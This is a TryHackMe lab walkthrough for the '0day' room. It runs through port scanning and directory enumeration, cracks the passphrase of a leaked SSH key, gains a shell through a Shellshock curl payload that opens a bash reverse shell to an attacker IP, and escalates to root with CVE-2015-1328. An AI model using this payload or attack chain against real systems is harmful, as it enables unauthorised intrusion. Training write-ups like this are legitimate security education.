---
author: Supaaasuge
title: 0day - TryHackMe Writeup
date: 2024-05-07
Lastmod: 2024-05-07
description: "Writeup for TryHackMe room: 0day"
categories:
  - TryHackMe
tags:
  - Hash Cracking
  - ShellShock
  - CVE-2015-1328
  - ssh2john
---
0day is a Medium difficulty room from TryHackMe, I start off with a bit of enumeration before coming across a `.cgi` file on a particular endpoint that was vulnerable to ShellShock. Once I used ShellShock to get a foothold as www-data, I was able to perform further enumeration of the host. Due to the old Ubuntu version, I was able to then leverage CVE-2015-1328 to escalate my privileges to root.

## Enumeration
IP=`10.10.63.19`


Starting off as usual I will scan for open ports:
```bash
nmap -p- --min-rate 10000 -Pn $IP -oA init.scan
Warning: 10.10.63.19 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.63.19
Host is up (0.30s latency).
Not shown: 36407 filtered tcp ports (no-response), 29126 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

And from these open ports I will perform a service version + TCP scan. 
```bash
sudo nmap -p22,80 -sCVT -O -Pn -oA scvto.scan 10.10.63.19

Nmap scan report for 10.10.63.19
Host is up (0.30s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 57:20:82:3c:62:aa:8f:42:23:c0:b8:93:99:6f:49:9c (DSA)
|   2048 4c:40:db:32:64:0d:11:0c:ef:4f:b8:5b:73:9b:c7:6b (RSA)
|   256 f7:6f:78:d5:83:52:a6:4d:da:21:3c:55:47:b7:2d:6d (ECDSA)
|_  256 a5:b4:f0:84:b6:a7:8d:eb:0a:9d:3e:74:37:33:65:16 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: 0day
|_http-server-header: Apache/2.4.7 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 5.4 (94%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (93%), Sony Android TV (Android 5.0) (93%), Android 5.0 - 6.0.1 (Linux 3.4) (93%), Android 5.1 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue May  7 20:47:26 2024 -- 1 IP address (1 host up) scanned in 26.50 seconds

```
Port 22: `OpenSSH 6.6.1p1 Ubuntu`
Port 80: `Apache httpd 2.4.7`

Moving on to the website on port 80, I will start off with gobuster:
```bash
gobuster dir -u http://10.10.63.19/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x cgi,bin,html,php,pdf,py
[SNIP]...
...[SNIP]
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 283]
/index.html           (Status: 200) [Size: 3025]
/cgi-bin              (Status: 301) [Size: 311] [--> http://10.10.63.19/cgi-bin/]
/img                  (Status: 301) [Size: 307] [--> http://10.10.63.19/img/]
/uploads              (Status: 301) [Size: 311] [--> http://10.10.63.19/uploads/]
/admin                (Status: 301) [Size: 309] [--> http://10.10.63.19/admin/]
/css                  (Status: 301) [Size: 307] [--> http://10.10.63.19/css/]
/js                   (Status: 301) [Size: 306] [--> http://10.10.63.19/js/]
/backup               (Status: 301) [Size: 310] [--> http://10.10.63.19/backup/
```

![alt 3](/posts/0day-thm-1.png)


`/cgi-bin`:
![alt 4](/posts/0day-thm-2.png)

I am going to try and fuzz this endpoint some more as this looks like it is a directory, however I am going to try `feroxbuster` for this as it does a good job of automating this:
```bash
feroxbuster -u http://$IP/cgi-bin --smart -x gci,php,txt,html
[SNIP]
200      GET        0l        0w       13c http://10.10.63.19/cgi-bin/test.cgi
```

Nice! Before I go and check this out, I am going to look at some of the other endpoints:

But first I am going to check out `/backup`
![alt 3](/posts/0day-thm-3.png)

Looks like we have an encrypted RSA private key encrypted with AES-128 in CBC mode of operation. I'll go ahead and convert this private key to a hash for cracking using `ssh2john`.
```bash
┌──(kali㉿kali)-[~/Desktop/THM/0-day]
└─$ wget http://10.10.63.19/backup -O key.pem
--2024-05-07 21:05:53--  http://10.10.63.19/backup
Connecting to 10.10.63.19:80... connected.
HTTP request sent, awaiting response... 301 Moved Permanently
Location: http://10.10.63.19/backup/ [following]
--2024-05-07 21:05:53--  http://10.10.63.19/backup/
Reusing existing connection to 10.10.63.19:80.
HTTP request sent, awaiting response... 200 OK
Length: 1767 (1.7K) [text/html]
Saving to: ‘key.pem’

key.pem            100%[===============>]   1.73K  --.-KB/s    in 0s      

2024-05-07 21:05:54 (323 MB/s) - ‘key.pem’ saved [1767/1767]

---

┌──(kali㉿kali)-[~/Desktop/THM/0-day]
└─$ ls
backup                                            key.pem
ferox-http_10_10_63_19_cgi-bin_-1715130108.state  scvto.scan.gnmap
init.scan.gnmap                                   scvto.scan.nmap
init.scan.nmap                                    scvto.scan.xml
init.scan.xml

---

┌──(kali㉿kali)-[~/Desktop/THM/0-day]
└─$ cat key.pem
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547

T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx
H4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSM
FznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kS
Lafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv8
9zlECjERSysbUKYccnFknB1DwuJExD/erGRiLBYOGuMatc+EoagKkGpSZm4FtcIO
IrwxeyChI32vJs9W93PUqHMgCJGXEpY7/INMUQahDf3wnlVhBC10UWH9piIOupNN
SkjSbrIxOgWJhIcpE9BLVUE4ndAMi3t05MY1U0ko7/vvhzndeZcWhVJ3SdcIAx4g
/5D/YqcLtt/tKbLyuyggk23NzuspnbUwZWoo5fvg+jEgRud90s4dDWMEURGdB2Wt
w7uYJFhjijw8tw8WwaPHHQeYtHgrtwhmC/gLj1gxAq532QAgmXGoazXd3IeFRtGB
6+HLDl8VRDz1/4iZhafDC2gihKeWOjmLh83QqKwa4s1XIB6BKPZS/OgyM4RMnN3u
Zmv1rDPL+0yzt6A5BHENXfkNfFWRWQxvKtiGlSLmywPP5OHnv0mzb16QG0Es1FPl
xhVyHt/WKlaVZfTdrJneTn8Uu3vZ82MFf+evbdMPZMx9Xc3Ix7/hFeIxCdoMN4i6
8BoZFQBcoJaOufnLkTC0hHxN7T/t/QvcaIsWSFWdgwwnYFaJncHeEj7d1hnmsAii
b79Dfy384/lnjZMtX1NXIEghzQj5ga8TFnHe8umDNx5Cq5GpYN1BUtfWFYqtkGcn
vzLSJM07RAgqA+SPAY8lCnXe8gN+Nv/9+/+/uiefeFtOmrpDU2kRfr9JhZYx9TkL
wTqOP0XWjqufWNEIXXIpwXFctpZaEQcC40LpbBGTDiVWTQyx8AuI6YOfIt+k64fG
rtfjWPVv3yGOJmiqQOa8/pDGgtNPgnJmFFrBy2d37KzSoNpTlXmeT/drkeTaP6YW
RTz8Ieg+fmVtsgQelZQ44mhy0vE48o92Kxj3uAB6jZp8jxgACpcNBt3isg7H/dq6
oYiTtCJrL3IctTrEuBW8gE37UbSRqTuj9Foy+ynGmNPx5HQeC5aO/GoeSH0FelTk
cQKiDDxHq7mLMJZJO0oqdJfs6Jt/JO4gzdBh3Jt0gBoKnXMVY7P5u8da/4sV+kJE
99x7Dh8YXnj1As2gY+MMQHVuvCpnwRR7XLmK8Fj3TZU+WHK5P6W5fLK7u3MVt1eq
Ezf26lghbnEUn17KKu+VQ6EdIPL150HSks5V+2fC8JTQ1fl3rI9vowPPuC8aNj+Q
Qu5m65A5Urmr8Y01/Wjqn2wC7upxzt6hNBIMbcNrndZkg80feKZ8RD7wE7Exll2h
v3SBMMCT5ZrBFq54ia0ohThQ8hklPqYhdSebkQtU5HPYh+EL/vU1L9PfGv0zipst
gbLFOSPp+GmklnRpihaXaGYXsoKfXvAxGCVIhbaWLAp5AybIiXHyBWsbhbSRMK+P
-----END RSA PRIVATE KEY-----

---

┌──(kali㉿kali)-[~/Desktop/THM/0-day]
└─$ ssh2john key.pem > hash                          
---
┌──(kali㉿kali)-[~/Desktop/THM/0-day]
└─$ cat hash        
key.pem:$sshng$1$16$82823EE792E75948EE2DE731AF1A0547$1200$4fbf85fb78a59b915c159c76e269ebba0318e39e6f238eb5ce231be0d624f58255e6ec1caf1e107e53f6436564f298711f83fe3cb6fbf6709cd12ac138f065074577a632c96dfda129b65acc52edab816366aeba68b2c8af6751c3be0ccc748c1739c523b8ecc581703d4a99b64cf9b13717d5a7dc87e214e7f21de334d3b023bcaaab3aaafe5090c5d51acefb1769122da7f1d2625d72ebbfe5a477363355b65b8a672897227b245e20b4d7e627864aa3978232edf1339f6a999ca28f54fbfcf739440a31114b2b1b50a61c7271649c1d43c2e244c43fdeac64622c160e1ae31ab5cf84a1a80a906a52666e05b5c20e22bc317b20a1237daf26cf56f773d4a8732008919712963bfc834c5106a10dfdf09e5561042d745161fda6220eba934d4a48d26eb2313a058984872913d04b5541389dd00c8b7b74e4c635534928effbef8739dd79971685527749d708031e20ff90ff62a70bb6dfed29b2f2bb2820936dcdceeb299db530656a28e5fbe0fa312046e77dd2ce1d0d630451119d0765adc3bb982458638a3c3cb70f16c1a3c71d0798b4782bb708660bf80b8f583102ae77d900209971a86b35dddc878546d181ebe1cb0e5f15443cf5ff889985a7c30b682284a7963a398b87cdd0a8ac1ae2cd57201e8128f652fce83233844c9cddee666bf5ac33cbfb4cb3b7a03904710d5df90d7c5591590c6f2ad8869522e6cb03cfe4e1e7bf49b36f5e901b412cd453e5c615721edfd62a569565f4ddac99de4e7f14bb7bd9f363057fe7af6dd30f64cc7d5dcdc8c7bfe115e23109da0c3788baf01a1915005ca0968eb9f9cb9130b4847c4ded3fedfd0bdc688b1648559d830c276056899dc1de123eddd619e6b008a26fbf437f2dfce3f9678d932d5f5357204821cd08f981af131671def2e983371e42ab91a960dd4152d7d6158aad906727bf32d224cd3b44082a03e48f018f250a75def2037e36fffdfbffbfba279f785b4e9aba435369117ebf49859631f5390bc13a8e3f45d68eab9f58d1085d7229c1715cb6965a110702e342e96c11930e25564d0cb1f00b88e9839f22dfa4eb87c6aed7e358f56fdf218e2668aa40e6bcfe90c682d34f827266145ac1cb6777ecacd2a0da5395799e4ff76b91e4da3fa616453cfc21e83e7e656db2041e959438e26872d2f138f28f762b18f7b8007a8d9a7c8f18000a970d06dde2b20ec7fddabaa18893b4226b2f721cb53ac4b815bc804dfb51b491a93ba3f45a32fb29c698d3f1e4741e0b968efc6a1e487d057a54e47102a20c3c47abb98b3096493b4a2a7497ece89b7f24ee20cdd061dc9b74801a0a9d731563b3f9bbc75aff8b15fa4244f7dc7b0e1f185e78f502cda063e30c40756ebc2a67c1147b5cb98af058f74d953e5872b93fa5b97cb2bbbb7315b757aa1337f6ea58216e71149f5eca2aef9543a11d20f2f5e741d292ce55fb67c2f094d0d5f977ac8f6fa303cfb82f1a363f9042ee66eb903952b9abf18d35fd68ea9f6c02eeea71cedea134120c6dc36b9dd66483cd1f78a67c443ef013b131965da1bf748130c093e59ac116ae7889ad28853850f219253ea62175279b910b54e473d887e10bfef5352fd3df1afd338a9b2d81b2c53923e9f869a49674698a1697686617b2829f5ef03118254885b6962c0a790326c88971f2056b1b85b49130af8f

---

┌──(kali㉿kali)-[~/Desktop/THM/0-day]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
Created directory: /home/kali/.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 10 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
letmein          (key.pem)     
1g 0:00:00:00 DONE (2024-05-07 21:06) 25.00g/s 14000p/s 14000c/s 14000C/s teiubesc..ganda
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Password: `letmein`

Sadly, I don't have a username to go with this so I decided to do some research on `.cgi` files.

- [Source](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi?ref=benheater.com#shellshock)
### CGI
CGI scripts are perl scripts, if you have a compromised server that can execute `.cgi` scripts you can upload a perl reverse shell, and change the extension from `.pl` to `.cgi`. 
#### ShellShock explained

**ShellShock** is a **vulnerability** that affects the widely used **Bash** command-line shell in Unix-based operating systems. It targets the ability of Bash to run commands passed by applications. The vulnerability lies in the manipulation of **environment variables**, which are dynamic named values that impact how processes run on a computer. Attackers can exploit this by attaching **malicious code** to environment variables, which is executed upon receiving the variable. This allows attackers to potentially compromise the system.

Checking for the `shellshock` vulnerability:
```bash
nmap -p80 --script http-shellshock --script-args uri=/cgi-bin/test.cgi 10.10.63.19

PORT   STATE SERVICE
80/tcp open  http
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     References:
|       http://www.openwall.com/lists/oss-security/2014/09/24/10
|       http://seclists.org/oss-sec/2014/q3/685
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271

Nmap done: 1 IP address (1 host up) scanned in 3.56 seconds
```

As seen on the post on hack trickz, we can exploit this using curl as follows:
```bash
curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/LOCAL_IP/PORT 0>&1' http://MACHINE_IP/cgi-bin/test.cgi
```

Actual exploit PoC:
```bash
curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/10.6.50.164/4444 0>&1' http://10.10.63.19/cgi-bin/test.cgi
```

Before I send that, I will start a listener on port 4444:
```bash
sudo rlwrap nc -lvnp 4444
```
![alt 3](/posts/0day-thm-5.png)
![great success](https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Ftse1.mm.bing.net%2Fth%3Fid%3DOIP._x1N6mn_0EHDDSMri0a79wHaEK%26pid%3DApi&f=1&ipt=4b48a5164472739d7c6d14359ee0a019f3c2e1f2af7764844fc30387bc053066&ipo=images)

We can now grab `user.txt` and move forward with post exploitation enumeration to try and get root privileges

### Local enumeration for privilege escalation

**Kernel Information**

**Users and groups**
```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
ryan:x:1000:1000:Ubuntu 14.04.1,,,:/home/ryan:/bin/bash
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
```
- Notice the Ubuntu version: `ryan:x:1000:1000:Ubuntu 14.04.1,,,:/home/ryan:/bin/bash`
```bash
Groups:

cat /etc/group
root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:syslog
tty:x:5:
disk:x:6:
lp:x:7:
mail:x:8:
news:x:9:
uucp:x:10:
man:x:12:
proxy:x:13:
kmem:x:15:
dialout:x:20:
fax:x:21:
voice:x:22:
cdrom:x:24:
floppy:x:25:
tape:x:26:
sudo:x:27:
audio:x:29:
dip:x:30:
www-data:x:33:
backup:x:34:
operator:x:37:
list:x:38:
irc:x:39:
src:x:40:
gnats:x:41:
shadow:x:42:
utmp:x:43:
video:x:44:
sasl:x:45:
plugdev:x:46:
staff:x:50:
games:x:60:
users:x:100:
nogroup:x:65534:
libuuid:x:101:
netdev:x:102:
crontab:x:103:
syslog:x:104:
messagebus:x:105:
fuse:x:106:
mlocate:x:107:
ssh:x:108:
ryan:x:1000:
lpadmin:x:109:
sambashare:x:110:
ssl-cert:x:111:
```
**Os information**
```bash
3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014

Ubuntu 14.0.1
```
This version of ubuntu is really old, so I'm fairly confident I can find an exploit somewhere to escalate privileges to root. Performing a quick google search `Ubuntu 14.0.1 privilege escalation exploit` brings us to a PoC for [CVE-2015-1328](https://www.exploit-db.com/exploits/37292).

I then grabbed the correct PoC exploit code, pulled it over to the remote machine compiled it, ran it and boom. Got root! 


![alt](/posts/0day-thm-4.png)

Thanks for reading!